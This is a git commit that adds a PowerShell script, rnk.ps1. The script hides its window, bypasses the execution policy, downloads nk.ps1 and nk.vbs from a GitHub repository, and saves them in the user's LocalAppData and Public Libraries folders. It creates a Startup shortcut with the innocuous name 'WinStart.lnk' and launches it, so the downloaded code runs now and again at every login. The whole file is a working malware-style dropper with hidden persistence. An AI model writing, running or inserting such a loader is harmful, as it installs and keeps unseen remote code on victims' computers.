f6568bce8a2e4bea89f50af721f0e1df875061de
KevinDark5 <jotpaz@imail.edu.vn>
2025-03-12 22:36:55 +0700

    Add files via upload

---
+++ rnk.ps1
@@ -0,0 +1,32 @@
+cmd /c start /min "" powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -Command"
+$LocalPath = "$env:LOCALAPPDATA"
+$StartupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
+$PublicLibPath = "C:\Users\Public\Libraries"
+
+# File URLs
+$File1Url = "https://github.com/KevinDark5/taproject/raw/refs/heads/main/nk.ps1"
+$File2Url = "https://github.com/KevinDark5/taproject/raw/refs/heads/main/nk.vbs"
+
+# File names
+$File1Name = "nk.ps1"
+$File2Name = "nk.vbs"
+
+# Full paths to save the files
+$File1Path = Join-Path -Path $LocalPath -ChildPath $File1Name
+$File2Path = Join-Path -Path $PublicLibPath -ChildPath $File2Name
+
+# Download fileta.ps1
+Invoke-WebRequest -Uri $File1Url -OutFile $File1Path
+
+# Download Startup.vbs
+Invoke-WebRequest -Uri $File2Url -OutFile $File2Path
+
+# Create a shortcut for Startup.vbs
+$ShortcutPath = Join-Path -Path $StartupPath -ChildPath "WinStart.lnk"
+$WScriptShell = New-Object -ComObject WScript.Shell
+$Shortcut = $WScriptShell.CreateShortcut($ShortcutPath)
+$Shortcut.TargetPath = $File2Path
+$Shortcut.Save()
+
+# Execute the shortcut
+Start-Process $ShortcutPath
